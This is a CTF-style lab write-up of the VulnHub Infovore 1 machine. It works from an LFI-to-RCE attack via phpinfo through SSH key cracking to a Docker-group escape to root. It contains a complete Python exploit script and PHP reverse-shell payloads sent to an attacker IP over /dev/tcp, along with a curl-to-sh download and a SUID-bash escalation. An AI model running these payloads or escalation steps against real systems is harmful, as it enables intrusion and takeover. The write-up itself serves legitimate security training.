---
aliases: []
tags:
  - writeup
  - machine
  - vulnhub
  - linux
  - lfi
  - rce
  - reverse-shell
  - docker
  - ssh
  - capabilities
machine: Infovore
platform: Linux
difficulty: Easy/Intermediate
date: 2026-09-25
techniques:
  - LFI to RCE through PHP info and file upload
  - Docker escape
  - SSH key reuse
  - tar capability abuse
cve: []
initial vector: LFI to RCE through PHP info and file upload
privilege escalation: Docker group escape and tar capability abuse
author: null
source: https://www.vulnhub.com/entry/infovore-1,496/
---

- **Infovore 1 machine**: [https://www.vulnhub.com/entry/infovore-1,496/](https://www.vulnhub.com/entry/infovore-1,496/)

## Reconnaissance
As always we start the recon phase with an *arp-scan* on the local network to detect the victim machine's IP.
```bash
arp-scan -I ens33 --localnet
```
Once we have the IP (192.168.18.240) we proceed with a port scan in Nmap.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.240 -oG allPorts 

nmap -sC -sV -p80 192.168.18.240 -oN Targgeted

nmap --script http-enum -p80 192.168.18.240 -oN webScan
```
We find a */include me* directory and an */info.php*. The latter gives us a lot of valuable info about the PHP version and future attack vectors, but for now we can't do much. *file_uploads* is on, which means we can achieve *LFI to RCE* by abusing this via a *POST* request.
https://hacktricks.wiki/es/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html

## Exploitation

### LFI to RCE via phpinfo
We open Burp Suite and intercept info.php, change the method from GET to POST and add a few plain-text lines.
```burpsuite
POST /info.php HTTP/1.1

Host: 192.168.18.240

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7

Accept-Encoding: gzip, deflate, br

Sec-GPC: 1

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i

Content-Type: multipart/form-data; boundary=--pwned

Content-Length: 194



----pwned

Content-Disposition: form-data; name="name"; filename="cmd.php"

Content-Type: text/plain


<?php system("bash -c 'bash -1 >& /dev/tcp/192.168.18.226/443 0>&1'*); ?>


----pwned
```
When we send the request, we can see the page tries to create cmd.php in a temporary directory. This means that if we find a way to point at that resource, which already exists, and get the PHP code executed, we'd have a reverse shell and be in.
To find that way to point at the file, we run *wfuzz* against the main path.
```bash
wfuzz -c --hl=136 -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://192.168.18.240/index.php?FUZZ=etc/passwd"
```
We find a *filename* parameter. So now with Burp Suite we have a potential way to create a file and execute it via filename, but the file we create is immediately deleted, so what we'll do is continuously send requests on filename so that, the moment the file is created, it gets executed.
We'll do this with a script from the website mentioned above:
```python
#!/usr/bin/env python3
# Original credits: https://github.com/diegoalbuquerque
# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
# Adaptado a Python3 para compatibilidad y uso actual por Metahumo

from __future__ import print_function
import sys
import threading
import socket

def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """%s\r
<?php system("bash -c 'bash -i >& /dev/tcp/<IP_Atacante>/443 0>&1'");?>\r""" % TAG
    REQ1_DATA = (
        "-----------------------------7dbff1ded0714\r\n"
        "Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n"
        "%s\r\n"
        "-----------------------------7dbff1ded0714--\r\n"
    ) % PAYLOAD

    padding = "A" * 5000

    content_length = len(REQ1_DATA.encode('utf-8'))
    REQ1 = ( # sustituir 'info.php' por la ruta que proceda
        "POST /info.php?a=" + padding + " HTTP/1.1\r\n"
        "Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=" + padding + "\r\n"
        "HTTP_ACCEPT: " + padding + "\r\n"
        "HTTP_USER_AGENT: " + padding + "\r\n"
        "HTTP_ACCEPT_LANGUAGE: " + padding + "\r\n"
        "HTTP_PRAGMA: " + padding + "\r\n"
        "Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\n"
        "Content-Length: %s\r\n"
        "Host: %s\r\n"
        "\r\n"
        "%s"
    ) % (content_length, host, REQ1_DATA)

    LFIREQ = ( # sustituir 'index.php?filename' por la ruta que proceda
        "GET /index.php?filename=%s HTTP/1.1\r\n"
        "User-Agent: Mozilla/4.0\r\n"
        "Proxy-Connection: Keep-Alive\r\n"
        "Host: %s\r\n"
        "\r\n"
    )

    return (REQ1, TAG, LFIREQ)


def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        s2.connect((host, port))

        # enviar request phpinfo (bytes)
        s.sendall(phpinforeq.encode('utf-8'))

        # leer suficiente para encontrar tmp_name (rápido)
        d = b""
        while len(d) < max(4096, offset):
            chunk = s.recv(4096)
            if not chunk:
                break
            d += chunk

        # buscar tmp_name en bytes (soporta "&gt;")
        i = d.find(b"[tmp_name] =>")
        if i == -1:
            i = d.find(b"[tmp_name] =&gt;")
        if i == -1:
            return None

        fn = d[i+17:i+31].split()[0].decode('utf-8', errors='ignore')

        # pedir LFI (enviar y leer toda la respuesta)
        s2.sendall((lfireq % (fn, host)).encode('utf-8'))

        d2 = b""
        while True:
            chunk = s2.recv(4096)
            if not chunk:
                break
            d2 += chunk

        if tag.encode('utf-8') in d2:
            return fn

    finally:
        try:
            s.close()
        except Exception:
            pass
        try:
            s2.close()
        except Exception:
            pass

    return None


counter = 0


class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\nGot it! Shell created in /tmp/g (filename: %s)" % x)
                    self.event.set()
            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the phpinfo output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(phpinforeq.encode('utf-8'))

    d = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        d += chunk
        # detectar final chunked (si aplica)
        if chunk.endswith(b"0\r\n\r\n"):
            break
    s.close()

    i = d.find(b"[tmp_name] =>")
    if i == -1:
        i = d.find(b"[tmp_name] =&gt;")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print("found %s at %i" % (d[i:i+10].decode('utf-8', errors='ignore'), i))
    return i + 256


def main():
    print("LFI With PHPInfo()")
    print("-=" * 30)

    if len(sys.argv) < 2:
        print("Usage: %s host [port] [threads]" % sys.argv[0])
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("Error with hostname %s: %s" % (sys.argv[1], e))
        sys.exit(1)

    port = 80
    try:
        port = int(sys.argv[2])
    except (IndexError, ValueError):
        port = 80

    poolsz = 10
    try:
        poolsz = int(sys.argv[3])
    except (IndexError, ValueError):
        poolsz = 10

    print("Getting initial offset...", end=' ')
    reqphp, tag, reqlfi = setup(host, port)
    try:
        offset = getOffset(host, port, reqphp)
    except Exception as e:
        print("\nError obteniendo offset:", e)
        sys.exit(1)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print("Spawning worker pool (%d)..." % poolsz)
    sys.stdout.flush()

    tp = []
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write("\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print()
        if e.is_set():
            print("Woot!  \\m/")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("Shuttin' down...")
    for t in tp:
        t.join()


if __name__ == "__main__":
    print("Don't forget to modify the LFI URL")
    main()
```
### Reverse shell
Here we just need to add the attacker IP where it belongs, start a listener with nc on 443, and pass the machine's IP and port when running the script. That gives us a shell, and we proceed with the TTY upgrade:
```shell
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```
The user is *www-data*, and running *hostname -I* shows a different IP, which tells us we're inside a container.

## Privilege escalation

### Container root (linPEAS + key cracking)
To escalate we'll need to escape the container. After trying the usual escalation paths — capabilities, config files, users with "sh$" access, files containing passwd... — nothing worked or turned up anything relevant.
We proceed to use *linPEAS*, a tool allowed on the OSCP because it doesn't exploit, it only enumerates.
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
``` 
and we find LOTS of things, but let's focus on a hidden file in the root called *.oldkeys.tgz*. We move it to /tmp/, rename it so it's no longer hidden, and run *tar -xf* to extract it.
We get two files; one of them (root) is the encrypted private key for root. On top of that, we can see that port 22 of the victim machine is open.
```bash
hostname -I
cat /proc/net/arp
echo '' > /dev/tcp/192.168.150.1/22
```
So we could try using this private key to connect as root to the main machine.

We'll use john to crack it:
```bash
nvim id_rsa
python2.7 /usr/lib/john/ssh2john.py id_rsa
nvim hash 
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```
The id_rsa gives us the word *choclate93*; with this password we can't connect over SSH to the main machine, but at least we can become root in the container.
![[Pasted image 20260925132650.png|Root in the container and first flag]]
We get a first FLAG, but the goal is to escape the container.
### Pivot to the host over SSH
To reach the main machine, if we go to *~/.ssh* we'll find the SSH keys plus a *known_hosts* file listing the admin user, which suggests there may be a trust relationship between that user and the main machine thanks to the configured keys.
We try to connect as the admin user to the main machine over SSH and hit credential reuse — *choclate93* in this case.
![[Pasted image 20260925133555.png|SSH access as admin to the main machine]]
Now we'd need to escalate to root on the main machine.

### Docker group escape to root
We're in the Docker group, so we can create a container and, by abusing mounts, mount the entire system root inside a container, gaining full access to everything.
```bash
docker run -dit -v /:/mnt/root --name privesc theart42/infovore
```
![[Pasted image 20260925134459.png|Host root mounted in a Docker container and SUID on bash]]
What we do in the image is enter the Docker mount of the system and set the SUID bit on bash. Then we exit, and running *bash -p* makes us root. We go to the directory and read the last FLAG.
![[Pasted image 20260925135210.png|Root shell on the host and final flag]]